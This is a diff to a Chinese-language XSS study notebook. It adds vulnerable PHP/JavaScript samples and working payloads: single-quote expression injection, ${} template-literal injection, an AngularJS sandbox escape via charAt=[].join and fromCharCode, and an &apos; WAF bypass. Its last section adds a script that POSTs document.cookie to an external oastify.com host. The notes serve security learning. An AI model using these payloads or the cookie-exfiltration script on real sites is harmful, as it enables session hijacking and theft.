@@ -314,7 +314,7 @@ decodeURIComponent('%22')` -> `"`
 %22);alert(document.cookie);//
 ```
 
-### AngularJS 模板注入 XSS
+### AngularJS constructor 绕过
 #### 漏洞源码
 ```php
 <?php
@@ -468,6 +468,98 @@ echo "<link rel='canonical' href='$safe_url'>";
 /?%27accesskey=%27x%27onclick=%27alert(document.cookie)
 ```
 
+### JavaScript 表达式绕过
+#### 漏洞源码
+输入被反射在 JavaScript 对象的属性值中，被单引号包裹
+后端使用了 `htmlspecialchars($q, ENT_COMPAT)`。`ENT_COMPAT` (默认模式) 仅编码双引号 `"`，**不编码单引号 `'`**
+```javascript
+var analyticsData = {
+    sessionId: "sess_<?php echo uniqid(); ?>",
+    timestamp: <?php echo time(); ?>,
+    searchTerm: '<?php echo isset($_GET['q']) ? htmlspecialchars($_GET['q'], ENT_COMPAT) : ''; ?>',
+    category: 'general'
+};
+```
+#### 漏洞利用
+利用 JavaScript 表达式 `''-alert(document.cookie)-''` 执行 Payload
+其插入到源码中则是 `searchTerm: ''-alert(document.cookie)-'',`。在 JavaScript 解释器看来，这是在执行一个数学减法运算
+解析结构 ：
+JS 引擎把这行代码解析为三个部分，通过减号 - 连接：
+    第一部分： '' (空字符串)
+    第二部分： alert(document.cookie) (函数调用)
+    第三部分： '' (空字符串)
+为了计算这个减法表达式的值，JS 引擎必须先求出每一个操作数的值，也就是浏览器必须立即执行 alert(document.cookie) 函数
+#### Payload
+```html
+'-alert(document.cookie)-'
+```
+
+### ${} 表达式绕过
+#### 漏洞源码
+使用 escape_for_template_literal 将危险字符转为 Unicode 形式，这样不会破坏模板字符串的边界或形成 HTML 注入
+```php
+function escape_for_template_literal($s) {
+    return strtr($s, [
+        '<' => '\\u003C',
+        '>' => '\\u003E',
+        '"' => '\\u0022',
+        "'" => '\\u0027',
+        '\\' => '\\u005C',
+        '`' => '\\u0060',
+    ]);
+}
+$q = isset($_GET['q']) ? $_GET['q'] : '';
+$escaped = escape_for_template_literal($q);
+```
+用户输入直接拼接进模板字符串源码
+```html
+<input type="text" name="q" placeholder="Enter payload here" value="<?php echo htmlspecialchars($q, ENT_QUOTES); ?>">
+```
+#### 绕过思路
+模板字符串是用反引号 `...` 包裹的字符串，内部的 ${...} 是“表达式插槽”，不是普通文本
+当 JavaScript 解析到模板字符串时，会先计算所有 ${...} 表达式的值，再把结果拼接成最终字符串
+因此如果用户输入被原样放进模板字符串源码中， ${alert(document.cookie)} 会在解析阶段执行 alert(document.cookie)
+#### Payload
+```javascript
+${alert(document.cookie)}
+```
+
+### AngularJS 无字符串逃逸链
+#### 漏洞源码
+取第一个 & 之后的整段查询串作为表达式，进行 urldecode 后注入
+```php
+if ($qs !== '') {
+    $parts = explode('&', $qs);
+    if (count($parts) > 1) {
+        $expr = urldecode(implode('&', array_slice($parts, 1)));
+    } else {
+        $expr = $search !== '' ? $search : '1';
+    }
+}
+```
+```html
+<div>{{ <?php echo $expr; ?> }}</div>
+<div ng-init="<?php echo $expr; ?>"></div>
+```
+#### 绕过思路
+##### 沙箱破坏
+1. toString() → 获取字符串对象（如 "1"）
+2. constructor.prototype → 获取 String 原型
+3. charAt=[].join → 将 String 的 charAt 方法替换为 Array 的 join 方法
+AngularJS 沙箱使用 charAt 检查标识符是否合法（防止使用危险的属性如 constructor）。当 charAt 被替换为 join 后
+1. 检查 "constructor".charAt(0) 原本应该返回 "c"
+2. 现在变成 ["constructor"].join() 返回 "constructor"（整个字符串）
+3. 使得沙箱误以为 constructor 是合法标识符
+##### 表达式构造
+1. [1] → 创建一个数组
+2. |orderBy: → AngularJS 过滤器语法，将数组传递给 orderBy 过滤器
+3. toString().constructor → 现在可以访问 String 构造函数（由于第一步破坏了检查）
+4. fromCharCode(120,61,97,108,101,114,116,40,49,41) → 构建字符串 x=alert(1)
+#### Payload
+```
+?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41)=1
+```
+
 ### 
 
 ## XSS 实战
@@ -547,7 +639,7 @@ document.write('</select>');
 在 URL 中添加 `?storeId=img src=x onerror=alert(document.cookie)>`
 当页面加载时，JS 代码执行
 
-### 返回连接 XSS
+### 返回链接 XSS
 #### 漏洞源码
 页面包含一个“返回首页”的链接
 JS 代码从 URL 参数 `returnPath` 中获取值，并使用 jQuery 的 `attr()` 方法将其设置为该链接的 `href` 属性
@@ -609,31 +701,6 @@ $(document).ready(function() {
 #<img src=x onerror=alert(document.cookie)>
 ```
 
-### JavaScript 表达式 XSS
-#### 漏洞源码
-输入被反射在 JavaScript 对象的属性值中，被单引号包裹
-后端使用了 `htmlspecialchars($q, ENT_COMPAT)`。`ENT_COMPAT` (默认模式) 仅编码双引号 `"`，**不编码单引号 `'`**
-```javascript
-var analyticsData = {
-    sessionId: "sess_<?php echo uniqid(); ?>",
-    timestamp: <?php echo time(); ?>,
-    searchTerm: '<?php echo isset($_GET['q']) ? htmlspecialchars($_GET['q'], ENT_COMPAT) : ''; ?>',
-    category: 'general'
-};
-```
-#### 漏洞利用
-利用 JavaScript 表达式 `''-alert(document.cookie)-''` 执行 Payload
-其插入到源码中则是 `searchTerm: ''-alert(document.cookie)-'',`。在 JavaScript 解释器看来，这是在执行一个数学减法运算
-解析结构 ：
-JS 引擎把这行代码解析为三个部分，通过减号 - 连接：
-    第一部分： '' (空字符串)
-    第二部分： alert(document.cookie) (函数调用)
-    第三部分： '' (空字符串)
-为了计算这个减法表达式的值，JS 引擎必须先求出每一个操作数的值，也就是浏览器必须立即执行 alert(document.cookie) 函数
-```html
-'-alert(document.cookie)-'
-```
-
 ### JSON XSS
 #### 漏洞源码
 ##### 服务端
@@ -673,5 +740,40 @@ try {
         `//` -> 注释掉剩余字符 (即原本的 `"})`)
         最终代码: `({"searchTerm":"\\" -alert(document.cookie)})` -> 合法 JS 代码，执行成功
 
+
+### 链接 XSS 绕 WAF
+#### 漏洞源码
+未对 `&apos;` 做任何处理，它不是实际的单引号字符，而是一段实体文本，会在 HTML 属性解析阶段被还原为 ' ，绕过了对 ' 的事先转义
+```php
+$author = htmlspecialchars($c['author'], ENT_QUOTES);
+$website_raw = $c['website'];
+$website_for_js = encode_for_onclick_js_single_quoted($website_raw);
+$text = htmlspecialchars($c['text']);
+```
+#### 漏洞利用
+```html
+http://foo?&apos;-alert(document.cookie)-&apos;
+```
+
+
+### 
+
+## XSS 危害
+### 配合 CSRF 获取敏感信息
+#### 漏洞源码
+`$c['text']` 直接输出到页面，未做任何转义
+```html
+<div class="text"><?php echo $c['text']; ?></div>
+```
+#### 漏洞利用
+```javascript
+<script>
+fetch('https://fk3tzxm662voz7xpeuzimwixjopfd81x.oastify.com', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+```
 
 ### 
